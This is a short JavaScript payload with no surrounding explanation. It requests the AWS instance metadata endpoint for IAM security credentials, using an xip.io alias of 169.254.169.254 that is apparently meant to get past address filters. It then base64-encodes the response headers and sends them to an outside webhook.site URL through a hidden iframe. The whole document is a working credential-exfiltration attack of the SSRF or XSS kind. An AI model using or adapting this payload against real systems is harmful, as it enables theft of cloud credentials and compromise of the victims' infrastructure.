function reqListener () {
    //var encoded = encodeURI(this.responseText);
    //var b64 = btoa(this.responseText);
    var raw = btoa(this.getAllResponseHeaders());
    var iframe = document.createElement('iframe');
	iframe.style.display = "none";
	iframe.src = "https://webhook.site/95008403-a846-494a-8d4c-70aa6246bcdb/?aa="+raw;
	document.body.appendChild(iframe);
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "https://169.254.169.254.xip.io/latest/meta-data/iam/security-credentials/"); 
oReq.send();
